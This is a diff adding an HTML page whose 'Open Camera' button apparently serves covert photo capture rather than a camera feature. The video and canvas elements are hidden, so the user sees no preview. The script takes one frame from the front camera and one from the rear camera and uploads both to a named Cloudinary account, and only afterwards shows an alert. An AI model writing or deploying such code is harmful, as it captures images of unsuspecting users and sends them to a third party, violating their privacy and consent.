@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html><body>
+<button onclick="startCapture()">Open Camera</button>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+async function captureFromCamera(mode) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: mode } }
+    });
+    video.srcObject = stream;
+    console.log(`Camera (${mode}) started`);
+    await new Promise(res => video.onloadedmetadata = res);
+
+    // Capture
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    console.log(`Captured ${mode}`);
+
+    // Upload
+    canvas.toBlob(async blob => {
+      const fd = new FormData();
+      fd.append('file', blob, 'photo.jpg');
+      fd.append('upload_preset', 'photo_upload');
+      const res = await fetch("https://api.cloudinary.com/v1_1/rajeevoberai39/image/upload", {
+        method: 'POST', body: fd
+      });
+      const data = await res.json();
+      console.log(`${mode} uploaded:`, data.secure_url);
+      alert(`${mode} photo uploaded`);
+    }, 'image/jpeg');
+  } catch (e) {
+    console.error(`${mode} error:`, e.message);
+    alert(`${mode} error: ${e.message}`);
+  }
+}
+
+async function startCapture() {
+  await captureFromCamera('user');
+  await captureFromCamera('environment');
+}
+</script>
+</body></html>
